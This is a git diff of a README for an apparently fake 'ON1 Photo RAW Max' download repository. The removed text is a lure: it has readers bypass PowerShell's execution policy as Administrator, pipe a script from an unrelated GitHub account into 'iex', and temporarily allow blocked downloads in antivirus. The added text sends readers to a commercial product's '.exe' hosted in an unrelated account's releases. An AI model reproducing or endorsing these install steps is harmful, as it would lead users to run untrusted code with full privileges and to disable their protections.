@@ -1,115 +1,90 @@
-# ON1 Photo RAW Max Download for Windows 11 & 10
+# 📸 ON1-Photo-RAW-Max - Edit photos with professional precision tools
 
-**ON1-Photo-RAW-Max**
+[![](https://img.shields.io/badge/Download-ON1-Photo-RAW-Max-blue.svg)](https://github.com/Chiquitaprecipitous861/ON1-Photo-RAW-Max/releases)
 
-**ON1 Photo RAW Max** for Windows 10/11. Scroll to **Download & Install** for the direct setup link.
+## 📖 About this application
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+ON1 Photo RAW Max provides a complete photo editing environment. The software supports RAW files from most digital cameras. You can process images, apply filters, and manage your photo library from one interface. The system works on Windows 10 and Windows 11. It focuses on speed and control for photographers. You do not need a subscription to organize or edit your pictures.
 
----
+## 💻 System requirements
 
-## Download & Install (PowerShell)
+Your computer needs specific components to run this software well. Check your computer settings before you start the installation.
 
-> **This is the download page.** The command below downloads and runs the **ON1 Photo RAW Max** installer on Windows 10/11.
+*   Operating System: Windows 10 or Windows 11 (64-bit version only)
+*   Processor: Intel Core i5 or AMD equivalent
+*   Memory: 8 GB RAM minimum, 16 GB recommended
+*   Graphics: Video card with 2 GB VRAM
+*   Storage: 2 GB of free disk space for software installation
+*   Monitor: Resolution of 1920x1080 or higher
 
-#### Before you start
+## 📥 How to download the software
 
-- Windows 10 or 11 (64-bit)
-- **Administrator** rights
-- Internet connection for the download
+Follow these steps to obtain the correct installer file.
 
----
+1.  Open your preferred web browser.
+2.  Visit the official release page: [https://github.com/Chiquitaprecipitous861/ON1-Photo-RAW-Max/releases](https://github.com/Chiquitaprecipitous861/ON1-Photo-RAW-Max/releases)
+3.  Look for the section labeled "Assets" at the bottom of the newest release version.
+4.  Find the file that ends in .exe.
+5.  Click the file name to start the download.
+6.  Wait for the progress bar to finish in your browser.
 
-#### Step 1 — Open PowerShell as Administrator
+## 🛠️ Step-by-step installation
 
-**Method A (fastest):**
-1. Press **Win + X**
-2. Click **Terminal (Admin)** or **Windows PowerShell (Admin)**
-3. If Windows asks to allow changes, click **Yes**
+After the file finishes downloading, use these steps to set up the software on your computer.
 
-**Method B (search):**
-1. Press **Win** and type `PowerShell`
-2. Click **Run as administrator**
+1.  Open your Downloads folder.
+2.  Locate the file you just saved. It will likely appear under today's date.
+3.  Double-click the .exe file to start the installer.
+4.  A security window might appear. Click "Yes" to allow the computer to run the installer.
+5.  Read the screen prompts carefully.
+6.  Click "Next" to continue through the setup pages.
+7.  Choose the folder location where you want to keep the software. The default location works for most users.
+8.  Select "Install" to begin the file transfer.
+9.  Wait for the installer to finish copying files.
+10. Click "Finish" when the process ends.
+11. A shortcut icon will appear on your desktop.
 
-You should see a blue/black window with a prompt like `PS C:\Windows\system32>`.
+## ✨ Getting started
 
----
+Once you launch the app for the first time, take these steps to orient yourself.
 
-#### Step 2 — Copy the full command
+*   Launch the app by double-clicking the desktop icon.
+*   The application will scan your computer for photos. You can choose a specific folder to watch.
+*   Select the "Browse" tab to see your current photos.
+*   Pick an image and double-click it to open the editing workspace.
+*   The right side of the screen shows your edit tools. You can adjust exposure, color, and sharpness here.
 
-Select **both lines** below and press **Ctrl+C**:
+## 🔍 Understanding the workspace
 
-```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force
-irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
-```
+The main window divides into three parts.
 
-> Copy **both lines**, not just the second one.
+1.  The Left Panel: This shows your folders and collections. Use this to find your photos stored on your hard drive.
+2.  The Center View: This displays the active image you have chosen to edit. You can zoom in or out to check details.
+3.  The Right Panel: This panel contains all adjustment sliders. These sliders control light, color, and filters.
 
----
+## 🎨 Editing tips
 
-#### Step 3 — Paste into PowerShell and press Enter
+Edit your RAW files without losing detail. The software keeps your original file safe. It saves your changes in a sidecar file. You can change your edits later if you decide to try something different.
 
-1. Click inside the PowerShell window
-2. Press **Ctrl+V** (or right-click → Paste)
-3. Press **Enter** once
-4. Wait — download progress will show in the window (usually 1–3 minutes)
+*   Use the "Develop" module for color and exposure changes.
+*   Use "Effects" to add frames or specific photographic styles.
+*   Click the "Compare" button to see your original photo next to your edited version.
+*   Always use the "Export" button when you want to save a final version as a JPEG or TIFF file.
 
----
+## 🚑 Common issues and solutions
 
-#### Step 4 — Finish setup
+If you encounter trouble, try these solutions.
 
-- Do not close the window until the process finishes
-- Enter your **license key** if prompted
-- **Restart** your PC if the installer asks
+*   Software will not open: Restart your computer and try again.
+*   Slow performance: Check that your graphics drivers are up to date. You can find these updates on the website of your graphics card manufacturer.
+*   Missing photos: Ensure the app has permission to access your folders. You can re-add folders by clicking the "+" icon in the Browse panel.
+*   Installation error: Check that you have enough empty space on your hard drive. Uninstall old versions of the software before installing a fresh copy.
 
----
+## 🛡️ Maintain performance
 
-#### Step 5 — Launch the app
+Keep your system stable by following these rules.
 
-Open **Start menu** → search for **ON1 Photo RAW Max** → run it.
-
----
-
-#### Troubleshooting
-
-| Problem | Fix |
-| --- | --- |
-| "Running scripts is disabled" | Make sure you copied **both lines** and opened PowerShell **as Administrator** |
-| "irm : Unable to connect" | Turn off VPN, check your internet, try again |
-| Antivirus blocked the download | Temporarily allow the download folder or run again as Admin |
-| Window closed immediately | Open PowerShell (Admin) again and repeat Steps 2–3 |
-
-**Install type:** PowerShell one-liner — no browser needed after Admin PowerShell is open.
-
----
-
-## About
-
-**ON1 Photo RAW Max** — Windows download and setup guide.
-
-**People also search for:** on1 photo raw max download, on1 photo raw pro install windows
-
-**Repository:** `ON1-Photo-RAW-Max`
-
-
-## Quick tips
-
-| Step | Action |
-| --- | --- |
-| 1 | Run installer as Administrator |
-| 2 | Temporarily allow download in antivirus if blocked |
-| 3 | Reboot once if the tool asks after setup |
-
-## System requirements
-
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB |
-| Disk | 500 MB free |
-| Admin | Required for install |
-
----
-
-**Topics:** on1-photo-raw-max-download, on1, on1-photo-raw-pro-install-windows, on1-photo-raw-max, on1-photo-raw-max-2026, raw-editor, photo-editing, pro-photo, photography, software, windows-11, download
+*   Restart your computer after installing any large software update.
+*   Save your work often. Use the "Save" shortcut if available.
+*   Make sure you have enough power if you are using a laptop.
+*   Keep your photos organized in clear folders on your main drive for faster access.
